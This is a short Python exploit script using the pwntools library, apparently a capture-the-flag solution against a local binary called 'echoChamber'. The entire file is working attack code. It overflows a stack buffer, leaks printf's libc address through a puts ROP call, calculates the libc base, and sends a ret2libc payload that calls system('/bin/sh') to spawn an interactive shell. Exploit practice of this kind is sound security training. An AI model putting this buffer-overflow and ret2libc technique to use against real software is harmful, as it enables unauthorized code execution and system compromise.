from pwn import*

elf = context.binary = ELF('./echoChamber')
libc = ELF('./libc.so.6')
p = process()

buf2ret = 0x4c
payload = b'A' * buf2ret + p32(elf.plt['puts']) + p32(elf.sym['vulnerable_function']) + p32(elf.got['printf'])
p.recvuntil(b'>\x1b[0m ')
p.sendline(payload)

p.recvuntil(xor(payload, b'\xaa'))
p.recvline()

leak = p.recvline()
print(leak)
leak = leak[:0x4]
print(leak)
leak = leak.ljust(0x4, b'\x00')
leak = u32(leak)
log.info('leaked printf address: ' + hex(leak))
libc.address = leak - libc.sym['printf']
log.success("found libc's base address: " + hex(libc.address))
p.recvuntil(b'>\x1b[0m ')

payload = b'A' * buf2ret + p32(libc.sym['system']) + p32(0x0) + p32(next(libc.search(b'/bin/sh')))
p.sendline(payload)
log.info('popping a shell...')

p.interactive()

